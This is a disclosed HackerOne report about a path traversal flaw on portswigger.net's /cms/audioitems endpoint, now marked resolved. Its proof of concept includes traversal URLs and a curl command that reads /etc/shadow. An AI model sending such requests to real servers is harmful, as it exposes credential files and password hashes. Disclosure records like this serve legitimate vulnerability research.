---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '2424815'
original_report_id: '2424815'
title: '[portswigger.net] Path Traversal al /cms/audioitems'
weakness: Path Traversal
team_handle: portswigger
created_at: '2024-03-20T07:26:28.543Z'
disclosed_at: '2024-04-04T14:51:59.272Z'
has_bounty: true
visibility: full
substate: resolved
vote_count: 124
asset_identifier: portswigger.net
asset_type: URL
max_severity: critical
tags:
- hackerone
- path-traversal
---

# [portswigger.net] Path Traversal al /cms/audioitems

## Metadata

- HackerOne Report ID: 2424815
- Weakness: Path Traversal
- Program: portswigger
- Disclosed At: 2024-04-04T14:51:59.272Z
- Has Bounty: Yes
- Visibility: full
- Substate: resolved

## Original Report

Prelude.
I wasn't going to report it, I thought it was your laboratory but after my first analysis this seems real.

**Description**
It's detected a path traversal as root user that allows to remote attackers see internal files as root.

`https://portswigger.net/cms/audioitems//etc/networks`
`https://portswigger.net/cms/audioitems//etc/shadow`


**Poc**
`curl -kis "https://portswigger.net/cms/audioitems//etc/shadow"`
{F3132191}

## Impact

Abilit to read internal files as root

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
